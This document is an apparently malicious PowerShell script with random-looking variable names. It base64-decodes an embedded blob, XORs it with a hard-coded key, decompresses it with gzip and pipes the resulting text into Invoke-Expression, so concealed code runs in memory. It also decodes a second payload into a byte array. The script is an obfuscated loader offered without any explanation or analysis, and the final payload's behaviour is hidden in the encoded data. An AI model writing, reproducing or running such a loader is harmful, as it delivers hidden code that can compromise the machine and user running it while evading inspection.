$v8stzb2upehwygn = [System.Text.Encoding]::ascii
function r6md5lug04132fvhqnwit9zpjs7  {param($n0m9bq5syg8tjpe )
  $jki1r4xysuzp5tf = [System.Convert]::FromBase64String($n0m9bq5syg8tjpe)
  $zcbuv7swkfne30y= $v8stzb2upehwygn.GetBytes("6mvrnbdq2u9j")
    $vmsl4hi1p5g8dyx = $jki1r4xysuzp5tf
    $2pn8r9ifgla5o0c = $(for ($rno95ws7a1xmzub = 0; $rno95ws7a1xmzub -lt $vmsl4hi1p5g8dyx.length; ) {
        for ($lszwm9jtd76boy3 = 0; $lszwm9jtd76boy3 -lt $zcbuv7swkfne30y.length; $lszwm9jtd76boy3++) {
            $vmsl4hi1p5g8dyx[$rno95ws7a1xmzub] -bxor $zcbuv7swkfne30y[$lszwm9jtd76boy3]
            $rno95ws7a1xmzub++
            if ($rno95ws7a1xmzub -ge $vmsl4hi1p5g8dyx.Length) {
                $lszwm9jtd76boy3 = $zcbuv7swkfne30y.length
            }
        }
    })
	$d4b70ur9fcszk1p = New-Object System.IO.MemoryStream( , $2pn8r9ifgla5o0c )

	    $qm65rwhns7bkyza = New-Object System.IO.MemoryStream
        $nmh4o0129s8cfue = New-Object System.IO.Compression.GzipStream $d4b70ur9fcszk1p, ([IO.Compression.CompressionMode]::Decompress)
	    $nmh4o0129s8cfue.CopyTo( $qm65rwhns7bkyza )
        $nmh4o0129s8cfue.Close()
		$d4b70ur9fcszk1p.Close()
		[byte[]] $2639xn0clyrea7o = $qm65rwhns7bkyza.ToArray()
 $c69zl0nvy8tgfx1=$2639xn0clyrea7o
    return $c69zl0nvy8tgfx1
}
[byte[]]$5c8spx2doeykjq0=r6md5lug04132fvhqnwit9zpjs7 $cw4dvtxy7530r8h
[System.Text.Encoding]::ascii.GetString((r6md5lug04132fvhqnwit9zpjs7 "KeZ+cm5iZHE2dbQ87R+USn4fOtvKcqzhG4ETntyjuDPXVPD6srDmu8MUAkah7wvchmjI/0oRLUfNy9RRhxRu2mzLsUtPj422RN6n9oFQljx8dyZbvUFhVtxA4K+oeD315s3wVdg0D9NjCI4N5waulaUtzJRTmz38ohfD6g8l6hySJs2WjgpqCaRxugBXn6LrcxGNl4qmBFcTvyyM0Rb460baoCvou/uttHkl+j+qdvgrW6ubeUlmRNyUqjeiRwsjnmfjLWebrFhqseWFFJ1B6hyS3NWzAldaCr1F5UTY8FTK60oGW1GQmGCzps8/kU/VqBx7SG1GUMMvNj7KoNV6WiYimRHuqovLl4DKpQZjT5s2oJXY/QYaZnmZUgYUPXttpMjeXBW/HpInwr/pc92ZF8Y3D/OoIIoqnRcDSHGS65jAKdyRtImzfOaGhL5npa5gVggJ1Z0TWUgeQHQGarqSVKfAokk7Jy7PpJGxT4GHUGqMUp7dBnIigTktAc8XTjbtiXmF+pRnDMLDq8WSiqMKtGO1CUfsp7ySPXu8l/5kQhc+8Ph8ZYsWpSvQJRy0r/GtbbQG+69yGRRCnacn8c1Z6LSNAFJ/WH/JVMmTURs66AOpq5bzggN/oEMkHqx9nu4tMTk8TTv40B0FLSGE/697vpvLHHq7CWDGhqT9XijfRo+DfboQShjqVf9NajZ1LTfAaM7Mfo0eh9FubuwZDC1bR3QqLCP2SbSrJ7DDAxP5PoYp4ogZgT/iIO7hNm2bzuNpDA8PRppBZJQa2lZVUc552e3w6KcfqbZClIsihw3j0Cv6V3nV7lXYK2RwY1aeOYwxFTs837nxWGURwjRgt2ZHdfTmXlzjfCGdO2I9oEobvH89BSKjaeQZd7Ul2gYDB7EPV1IJ+L1EtB2G3dgx/T5nu8XinDkmoGQlY3mOby1iQFNH0lKbihLgvWmrGHnBiineL5R3YmxtrWZzkUrOQ3yuDSkNTb7k+k5CQ38fa3S+JdZwfsLxJU56X+15u6LKN4qLm0B0r1UTnlzDQmToy0nNoZhUKsXvHBISsba7dKs81LAA9MftZNHRm5KMn254vQ1L74FkfP9w0E10Mmk0f/VaHUcO8RJ+odPxFXuYyDjik5rnOgwB0acl4pstRI46LPvP+Ox44IGASPUK9bmOiWBBsFtuQJbPbfwdRcEA0NcLAXjwrYlGzwRpEAb56BBdlNf7phiCq3ka4YFwf8R/rN0EOzKu9mRTp1VWYTuJV49weNHDOk72LEsJeFBxbkwZ1UJbk5R/FyRqdnGS+tuvOORHZFRRwrvFz4iwNJXi5yanwam0fpEWr36IzvabF0nGhsKD0cYFj5yQCNfsGfTBXZbpHXmVN4JcwKf174e7ho88+UyCGu6cwMKfGBRZWSbVEmI5iVDpL2eHnymBBEnH8rq/fga/tVG2wpMXaGw3+heie+Nd9CB4kNbmIk4IhhoaGWh2F5OSVY9C94nhGfWWe92wgDntqMIltmG2vg7s8kRSE9ByfafOaJqxLxiJwWAdXQ9SIp36qP9l1EY2u+rbZoRV5TLMQMxjUpCDSWUjHxh9b3Ey"))|iex;